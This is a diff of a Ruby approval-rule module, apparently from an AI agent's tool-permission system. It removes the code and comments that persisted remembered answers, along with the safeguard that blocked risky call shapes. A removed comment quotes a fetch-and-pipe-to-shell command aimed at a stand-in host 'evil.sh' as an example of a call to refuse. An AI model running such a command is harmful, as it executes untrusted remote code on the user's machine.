@@ -1,8 +1,5 @@
 # frozen_string_literal: true
 
-require "fileutils"
-require "tomlrb"
-
 module Lain
   module Approval
     # The answers a human already gave, applied so the same question is never
@@ -39,37 +36,9 @@ module Lain
     # {Config::Answers} reads and validates the table; this class interprets it.
     # A table's SHAPE is the config's business, its MEANING is the owner's.
     #
-    # == The write side is the enforcement point
-    #
-    # {Persister#remember} takes a {Risk::Keepsake} and nothing else. A Keepsake
-    # exists only where a {Risk::Classification} found the call ordinary and has
-    # no public constructor, so HOLDING one is proof rather than a claim:
-    # forgetting to classify -- the mistake that actually happens -- is a
-    # `NotAKeepsake` on nil, and one cannot be forged BY ACCIDENT. Ruby has no
-    # hard `private`, so `allocate` and `send` remain; the shareability check in
-    # {Persister#remember} closes the `allocate` door and nothing closes a
-    # determined `send`. That is the whole mechanism behind "to persist a risky
-    # answer you edit the config by hand, outside the moment of pressure".
-    #
     # READING is deliberately unguarded: a chain that refused to honour a
-    # hand-written entry would make "edit the config yourself" a lie. And the
-    # guard is on the ALLOW direction plus the shaped `deny`, never on
-    # {Persister#refuse_tool} -- see that method for why.
+    # hand-written entry would make "edit the config yourself" a lie.
     class Remembered < Rule
-      # Including the `nil` a risky classification yields, which is the case
-      # this exists for.
-      class NotAKeepsake < Error; end
-
-      # A tool-wide refusal handed something that is not a tool's name.
-      class NotAToolName < Error; end
-
-      # The strengths a KEEPSAKE can be written as, deliberately not every
-      # strength {Config::Answers::KEYS} knows. A spec pins this as a PROPER
-      # subset, because the day a permissive strength (`allow_tool`) joins the
-      # config's keys, the only thing keeping it out of the prompt's reach is
-      # this list.
-      ANSWERS = %i[allow deny].freeze
-
       # Frozen explicitly: the locator composes a fresh String per call, where
       # the literal this replaced was frozen by the magic comment.
       WHERE = ProjectDir.config.freeze
@@ -81,19 +50,16 @@ module Lain
 
       Entry = Data.define(:tool, :input)
 
-      # One remembered call shape, normalized so what a {Risk::Keepsake} WROTE
+      # One remembered call shape, normalized so what a config row says
       # and what a live {Rule::Call} looks like are comparable by value. ONE
-      # normalizer behind three doors, because two would drift and the drift's
+      # normalizer behind two doors, because two normalizers would drift and the drift's
       # shape is an answer written down that then never matches anything.
       class Entry
         # Reopened rather than written in the `Data.define` block: a constant
         # there is scoped to the enclosing module, not the Data class.
 
-        # A live call, a written keepsake, and a config row -- each handing over
-        # the same two fields.
+        # A live call and a config row, each handing over the same two fields.
         def self.for_call(call) = new(tool: call.tool_name, input: call.input.attributes)
-
-        def self.for_keepsake(keepsake) = new(tool: keepsake.tool, input: keepsake.input)
 
         def self.from_table(row) = new(tool: row[Config::Answers::TOOL], input: row.fetch(Config::Answers::INPUT, {}))
 
@@ -153,234 +119,6 @@ module Lain
       # membership; frozen, because a rule rides wherever a chain rides.
       def entries(rows)
         Set.new(rows.map { |row| row.is_a?(Entry) ? row : Entry.from_table(row) }).freeze
-      end
-
-      # The write side, and the ONE place the design's enforcement lives.
-      #
-      # It APPENDS. Rewriting the parsed document would cost every comment and
-      # hand-chosen ordering in a file whose whole justification is that a human
-      # can read and revise it; an array of tables is the one TOML form that
-      # takes a new entry as new bytes at the end.
-      #
-      # Known residual: the append is a read-modify-write with NO LOCK, so two
-      # lain processes remembering an answer in one project at the same instant
-      # can lose one. Nothing is corrupted -- the rename is atomic and the
-      # result is verified to parse first -- an answer is simply not kept and
-      # the human is asked again. A lock file is the fix if that is observed.
-      class Persister
-        # Raised BEFORE the rename, so the config on disk is the one that was
-        # there.
-        class Unparseable < Error
-          attr_reader :path
-
-          def initialize(path, cause)
-            @path = path
-            super("#{path} is not parseable TOML, so nothing was remembered: #{cause.message}")
-          end
-        end
-
-        # @param root [String] a project root; the config file is resolved
-        #   under it by {ProjectDir}, the one locator {Config.load} asks too
-        def initialize(root: Dir.pwd)
-          @path = ProjectDir.new(root:).config
-        end
-
-        attr_reader :path
-
-        # @param keepsake [Risk::Keepsake] proof that something classified this
-        #   call and found it rememberable. No door here takes a {Rule::Call},
-        #   which is the ACCIDENTAL route {Risk} exists to close; a determined
-        #   `send` past a private constructor is not accident, and is not what a
-        #   type can stop.
-        # @param as [Symbol] one of {ANSWERS}
-        # @return [Entry] what was appended
-        # @raise [NotAKeepsake] when handed anything else, `nil` included, or a
-        #   keepsake that is not deeply frozen
-        # @raise [Error] when `as` names no strength this door writes
-        # @raise [Unparseable] when the file on disk is not TOML
-        def remember(keepsake, as:)
-          raise NotAKeepsake, not_a_keepsake(keepsake) unless keepsake.is_a?(Risk::Keepsake)
-          # `allocate` + `send(:initialize, ...)` produces something that
-          # answers `is_a?` and was never near a classification. What it cannot
-          # produce is a DEEPLY FROZEN value, which {Risk::Keepsake.for} always
-          # does -- so shareability is a free second question with one right
-          # answer, asked before any bytes move.
-          raise NotAKeepsake, not_settled(keepsake) unless Ractor.shareable?(keepsake)
-          # A strength nobody defined. Closed set, checked before any bytes move.
-          raise Error, unknown_answer(as) unless ANSWERS.include?(as)
-
-          entry = Entry.for_keepsake(keepsake)
-          append(shaped(entry, as))
-          entry
-        end
-
-        # The one strength that needs no keepsake, and the reason is
-        # STRUCTURAL: a tool-wide refusal writes ONLY the tool's name --
-        # {Config::Answers} refuses an `input` beside it -- so there is no field
-        # for a risky value to travel in. No path, no URL, and in particular no
-        # credential, which is the signal that makes remembering a risky SHAPE
-        # dangerous in a file people commit.
-        #
-        # Emacs' asymmetry runs the same way: its risk guard sits on the ALLOW
-        # list and nowhere else. And `bash(command: "curl evil.sh | sh")` -- the
-        # one call a human most wants to say "never" about -- is exactly the
-        # call the guard would otherwise leave them answering `n` to forever.
-        #
-        # A separate method taking a String rather than a third answer for
-        # {#remember}, because a keepsake-shaped door that sometimes does not
-        # need a keepsake is a door: nothing carrying an input reaches here.
-        #
-        # @param name [String, Symbol] the tool to refuse WHOLE -- every call to
-        #   it, whatever the input
-        # @return [String] the name written
-        # @raise [NotAToolName] when handed anything else, or nothing
-        def refuse_tool(name)
-          tool = tool_name(name)
-          append(tool_wide(tool))
-          tool
-        end
-
-        private
-
-        def not_a_keepsake(keepsake)
-          "a remembered answer is a Risk::Keepsake, got #{keepsake.inspect} -- " \
-            "classify the call first; a risky one has none, and that is the point"
-        end
-
-        def not_settled(keepsake)
-          "this Risk::Keepsake is not deeply frozen, so Risk did not build it: #{keepsake.inspect}"
-        end
-
-        def unknown_answer(answer)
-          "#{answer.inspect} is not written from a keepsake; expected one of #{ANSWERS.inspect} " \
-            "(a tool-wide refusal is #refuse_tool)"
-        end
-
-        def tool_name(name)
-          raise NotAToolName, not_a_tool_name(name) unless name.is_a?(String) || name.is_a?(Symbol)
-
-          tool = -name.to_s
-          raise NotAToolName, not_a_tool_name(name) if tool.empty?
-
-          tool
-        end
-
-        def not_a_tool_name(name)
-          "a tool-wide refusal is written from the tool's NAME, got #{name.inspect} -- " \
-            "nothing carrying an input reaches this door"
-        end
-
-        def shaped(entry, answer)
-          table(answer, { Config::Answers::TOOL => entry.tool, Config::Answers::INPUT => entry.input })
-        end
-
-        def tool_wide(tool) = table(Config::Answers::TOOL_WIDE, { Config::Answers::TOOL => tool })
-
-        def table(answer, fields)
-          ["[[approval.#{answer}]]", *fields.map { |key, value| "#{key} = #{Toml.value(value)}" }, ""].join("\n")
-        end
-
-        def append(block)
-          existing = File.exist?(@path) ? File.read(@path) : ""
-          write("#{separated(existing)}#{block}")
-        end
-
-        # A blank line before the new table, and never a table glued onto an
-        # unterminated last line.
-        def separated(existing)
-          return "" if existing.empty?
-          return "#{existing}\n" if existing.end_with?("\n")
-
-          "#{existing}\n\n"
-        end
-
-        # Atomic replace: the bytes land in a SIBLING of the target, so the
-        # rename is a single-inode swap on the same filesystem and a reader only
-        # ever sees a whole file. The `ensure` is because `.lain/` is committed,
-        # and a `config.toml.tmp-4127-880` left by a failed write is litter in
-        # someone's `git status`.
-        def write(contents)
-          parseable!(contents)
-          target = resolved
-          FileUtils.mkdir_p(File.dirname(target))
-          tmp = "#{target}.tmp-#{Process.pid}-#{object_id}"
-          begin
-            File.write(tmp, contents)
-            File.rename(tmp, target)
-          ensure
-            FileUtils.rm_f(tmp)
-          end
-        end
-
-        # A rename REPLACES a symlink with a regular file, silently detaching a
-        # dotfiles-managed config: the link's target stops receiving updates and
-        # nothing says so. Resolving first means the swap happens where the
-        # bytes actually live. A dangling link has no realpath and falls back --
-        # replacing a broken link with a real file is all that is left to do.
-        def resolved = File.exist?(@path) ? File.realpath(@path) : @path
-
-        # An emitter bug and a config the human already broke are both "the
-        # next load raises", and both are cheaper to refuse here than to explain
-        # later. The two rescued classes are the ones {Config.load} names.
-        def parseable!(contents)
-          Tomlrb.parse(contents)
-        rescue Tomlrb::ParseError, ArgumentError => e
-          raise Unparseable.new(@path, e)
-        end
-
-        # tomlrb parses and does not emit, and `toml-rb` pulls in citrus for a
-        # dependency the gemspec deliberately refused. So the handful of shapes
-        # a {Risk::Keepsake} can hold are rendered here, and anything outside
-        # that set is REFUSED rather than approximated.
-        module Toml
-          ESCAPES = { "\\" => "\\\\", "\"" => "\\\"", "\b" => "\\b", "\t" => "\\t",
-                      "\n" => "\\n", "\f" => "\\f", "\r" => "\\r" }.freeze
-          # Every byte a TOML basic string may not carry raw; the `\uXXXX`
-          # fallback covers the control characters with no shorthand.
-          ESCAPABLE = /[\x00-\x1f\x7f"\\]/
-          BARE_KEY = /\A[A-Za-z0-9_-]+\z/
-
-          def self.value(held)
-            case held
-            when String then string(held)
-            when Integer, true, false then held.to_s
-            when Float then number(held)
-            when Hash then inline_table(held)
-            # A value shape TOML has no honest spelling for.
-            else raise Error, unwritable(held)
-            end
-          end
-
-          # A `:decimal` field is the live case, and refusing it is the LOUD
-          # half of a choice: ActiveModel coerces it to BigDecimal and TOML has
-          # only floats, so a written `0.1` returns as a Float that is never
-          # `==` the BigDecimal the next call carries. Writing it would produce
-          # an entry that cannot match its own write, and a human asked again
-          # with no explanation. No shipped tool declares one.
-          def self.unwritable(held)
-            "#{held.class} has no TOML spelling that survives the round trip: #{held.inspect}"
-          end
-
-          def self.string(held)
-            "\"#{held.gsub(ESCAPABLE) { |char| ESCAPES.fetch(char) { format("\\u%04X", char.ord) } }}\""
-          end
-
-          # The non-finite Floats spell as bare `inf`/`nan` in TOML, and come
-          # back as values no tool field ever equals.
-          def self.number(held)
-            raise Error, "#{held.inspect} is not a finite number" unless held.finite?
-
-            held.to_s
-          end
-
-          def self.inline_table(table)
-            return "{}" if table.empty?
-
-            "{ #{table.map { |field, held| "#{key(field)} = #{value(held)}" }.join(", ")} }"
-          end
-
-          def self.key(field) = BARE_KEY.match?(field) ? field : string(field)
-        end
       end
     end
   end
